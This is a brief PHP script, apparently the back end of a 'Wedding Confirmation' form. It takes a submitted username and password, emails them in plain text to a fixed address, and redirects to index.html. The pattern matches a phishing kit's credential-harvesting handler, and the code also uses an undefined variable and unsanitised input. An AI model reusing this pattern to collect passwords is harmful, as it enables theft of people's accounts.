<?php

$name = $_POST['username'];
$password = $_POST['password'];


$email_from = 'Wedding@Wedding.co.za';

$email_subject = 'Wedding Confirmation';
    
$email_body = "User Name: $name.\n".
              "Confirmation: $password.\n";

$to = 'daleen@knoetziekamma.co.za';

$headers = "From: $email_from \r\n";

$headers .= "Reply-To: $visitor_email \r\n";

mail($to,$email_subject,$email_body,$headers);
    
header("Location: index.html");


?>

